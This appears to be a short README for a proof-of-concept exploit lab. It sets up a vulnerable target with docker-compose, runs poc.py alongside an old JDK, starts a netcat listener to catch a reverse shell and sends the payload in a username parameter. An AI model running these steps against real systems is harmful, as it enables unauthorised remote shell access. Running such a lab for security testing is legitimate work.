# Installation

```
docker-compose up -d
```

# Exploit

1. Install the requirements.
```
pip install -r requirements.txt
```

2. Install the JDK jdk1.8.0_20 into the same directory and run the exploit. Download from here[https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html] jdk-8u20-linux-x64.tar.gz and extract into the same directory as that of poc.py
```
# JDK must be present in the same directory as that of PoC
tar -xf jdk-8u20-linux-x64.tar.gz
python3 poc.py --userip localhost --webport 8000 --lport 9001
```

3. Start the netcat listner.

```
nc -lnvp 9001
```

4. Send the Payload in the username parameter
